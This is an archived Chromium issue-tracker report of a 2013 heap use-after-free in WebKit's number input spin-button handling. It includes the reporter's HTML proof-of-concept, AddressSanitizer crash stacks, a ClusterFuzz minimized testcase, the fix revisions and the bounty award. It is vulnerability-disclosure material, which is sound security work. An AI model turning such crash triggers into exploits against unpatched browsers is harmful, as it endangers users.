# Heap-use-after-free in WebCore::InputType::stepUpFromRenderer

| Field | Value |
|-------|-------|
| **Issue ID** | [40077600](https://issues.chromium.org/issues/40077600) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Unknown |
| **Reporter** | mi...@gmail.com |
| **Assignee** | tk...@chromium.org |
| **Created** | 2013-05-25 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

use-after-free in WebCore::InputType::stepUpFromRenderer(int)

**VERSION**  

Chrome Version: stable+dev  

Operating System: linux 64bit, osx

**REPRODUCTION CASE**

USER INTERACTION REQUIRED: you must press up or down arrows when the input is focused.

<html>
<head>
<script>
onload = function() {
el0=document.createElement('input')
el0.type='number'
document.body.appendChild(el0)
window.addEventListener('change', function(){ el0.type='' }, false)
el0.focus()
}
</script>
</head>
<body>
press Up or Down arrows
</body>
</html>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: renderer + asan  

Crash State:

==13639== ERROR: AddressSanitizer: heap-use-after-free on address 0x600e00010558 at pc 0x7f4008e8a1f9 bp 0x7fffc75e1a90 sp 0x7fffc75e1a88  

READ of size 8 at 0x600e00010558 thread T0 (asan-stable)  

#0 0x7f4008e8a1f8 in element /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/InputType.h:317:0  

#1 0x7f4008e8a1f8 in WebCore::InputType::stepUpFromRenderer(int) /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/InputType.cpp:1117:0  

#2 0x7f4008eae704 in WebCore::TextFieldInputType::handleKeydownEventForSpinButton(WebCore::KeyboardEvent\*) /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WebCore/html/TextFieldInputType.cpp:161:0  

#3 0x7f4008ea07a1 in WebCore::NumberInputType::handleKeydownEvent(WebCore::KeyboardEvent\*)

0x600e00010558 is located 8 bytes inside of 72-byte region [0x600e00010550,0x600e00010598)  

freed by thread T0 (asan-stable) here:  

#0 0x7f4006f23462 in free ??:0  

#1 0x7f4008dfba26 in deleteOwnedPtr[WebCore::InputType](javascript:void(0);) /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WTF/wtf/OwnPtrCommon.h:63:0  

#2 0x7f4008dfba26 in operator= /mnt/scratch0/tmpbuild/src/out/Release/../../third\_party/WebKit/Source/WTF/wtf/OwnPtr.h:141:0  

#3 0x7f4008dfba26 in WebCore::HTMLInputElement::updateType()

## Attachments

- deleted (application/octet-stream, 0 B)
- [872.txt](attachments/872.txt) (text/x-c; charset=us-ascii, 23.0 KB)
- [872.html](attachments/872.html) (text/html; charset=us-ascii, 367 B)
- [stable872.txt](attachments/stable872.txt) (text/x-c; charset=us-ascii, 21.2 KB)

## Timeline

### mi...@gmail.com (2013-05-25)

stable asan log

### in...@chromium.org (2013-05-25)

These input element event handle type change bugs are sprouting all the place. Please help to kill this madness.

### tk...@chromium.org (2013-05-27)

[Empty comment from Monorail migration]

### tk...@chromium.org (2013-05-27)

This is a regression by http://trac.webkit.org/changeset/94658


### in...@chromium.org (2013-05-27)

We caught in our fuzzers as well. 

### in...@chromium.org (2013-05-27)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=188312355

Fuzzer: Inferno_layout_test_fuzzer

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x607000094e58
Crash State:
  - crash stack -
  WebCore::InputType::stepUpFromRenderer
  WebCore::TextFieldInputType::handleKeydownEventForSpinButton
  - free stack -
  WebCore::HTMLInputElement::updateType
  WebCore::HTMLInputElement::parseAttribute
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=137694:137702

Minimized Testcase (0.44 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv96aAPoAfiQ64Bx2C2kjvL1CtWDPoLvTF3sKUHhy_z9cyI8pmwm-Ed-i5vgizLTj4ENbjMmFvSawmQwZ5jNJI0uCcWieYQJrl7HjZ4sZg71aSfEouk_U8LyzL_Wory4Fy7quFrDR_9WMkZ0J0JajQDvUR76FrQ
<input type="number" onchange="handleChange(this);">
<script>
function sendKey(keyName) {
    var event = document.createEvent('KeyboardEvent');
    event.initKeyboardEvent('keydown', true, true, document.defaultView, keyName);
    document.activeElement.dispatchEvent(event);
}

function handleChange(element) {
    element.type = '';
}

var numberInput = document.getElementsByTagName('input')[0];
numberInput.focus();
sendKey('Up');

</script>
>

### in...@chromium.org (2013-05-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2013-05-28)

ClusterFuzz has detected this issue as fixed in range 202382:202420.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=188312355

Fuzzer: Inferno_layout_test_fuzzer

Crash Type: Heap-use-after-free READ 8
Crash Address: 0x607000094e58
Crash State:
  - crash stack -
  WebCore::InputType::stepUpFromRenderer
  WebCore::TextFieldInputType::handleKeydownEventForSpinButton
  - free stack -
  WebCore::HTMLInputElement::updateType
  WebCore::HTMLInputElement::parseAttribute
  
Regressed: https://cluster-fuzz.appspot.com/revisions?range=137694:137702
Fixed: https://cluster-fuzz.appspot.com/revisions?range=202382:202420

Minimized Testcase: https://cluster-fuzz.appspot.com/download/AMIfv96aAPoAfiQ64Bx2C2kjvL1CtWDPoLvTF3sKUHhy_z9cyI8pmwm-Ed-i5vgizLTj4ENbjMmFvSawmQwZ5jNJI0uCcWieYQJrl7HjZ4sZg71aSfEouk_U8LyzL_Wory4Fy7quFrDR_9WMkZ0J0JajQDvUR76FrQ

If you suspect that the result above is incorrect, try re-doing that job on the testcase report page.

### in...@chromium.org (2013-05-28)

https://src.chromium.org/viewvc/blink?view=rev&revision=151175

### sc...@gmail.com (2013-06-07)

M28: r152059

### pa...@chromium.org (2013-06-27)

$1000 for this one. Thanks again!

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties.
*********************************

### sc...@gmail.com (2013-07-03)

[Empty comment from Monorail migration]

### pa...@chromium.org (2013-08-20)

[Empty comment from Monorail migration]

### js...@chromium.org (2013-11-18)

Bulk release of old security bug reports.


### ti...@chromium.org (2014-02-28)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-02)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### sh...@chromium.org (2018-07-29)

[Empty comment from Monorail migration]

### is...@google.com (2018-07-29)

This issue was migrated from crbug.com/chromium/243991?no_tracker_redirect=1

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40077600)*
